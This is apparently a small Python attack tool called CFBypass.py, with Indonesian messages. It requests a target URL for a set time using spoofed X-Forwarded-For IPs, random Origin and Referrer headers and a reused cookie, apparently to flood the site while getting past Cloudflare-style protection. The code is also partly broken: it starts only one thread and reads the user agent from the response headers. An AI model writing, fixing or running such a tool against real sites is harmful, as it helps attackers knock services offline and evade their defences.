import requests
import random
import time
import threading
import sys

def random_byte():
    return random.randint(0, 255)

def random_string_generate(length):
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    characters_length = len(characters)
    result = ''
    for _ in range(length):
        result += characters[random.randint(0, characters_length - 1)]
    return result

def main():
    if len(sys.argv) <= 2:
        print("Penggunaan: python CFBypass.py <url> <waktu>")
        sys.exit(-1)

    url = sys.argv[1]
    waktu = int(sys.argv[2])

    def get_website_data():
        try:
            res = requests.get(url)
            cookie = res.headers.get('Set-Cookie')
            user_agent = res.headers.get('User-Agent')

            if user_agent is None:
                with open('ua.txt', 'r') as f:
                    user_agent = f.read().strip()
            else:
                user_agent = user_agent

            random_string = random_string_generate(10)
            fake_ip = f"{random_byte()}.{random_byte()}.{random_byte()}.{random_byte()}"

            options = {
                'url': url,
                'headers': {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': 1,
                    'cookie': cookie,
                    'Origin': f"http://{random_string}.com",
                    'Referrer': f"http://google.com/{random_string}",
                    'X-Forwarded-For': fake_ip
                }
            }

            requests.get(options['url'], headers=options['headers'])
        except Exception as e:
            print(f"Terjadi kesalahan: {e}")

    threading.Thread(target=get_website_data).start()

    time.sleep(waktu)

    print("Pemintaan selesai.")

if __name__ == "__main__":
    main()
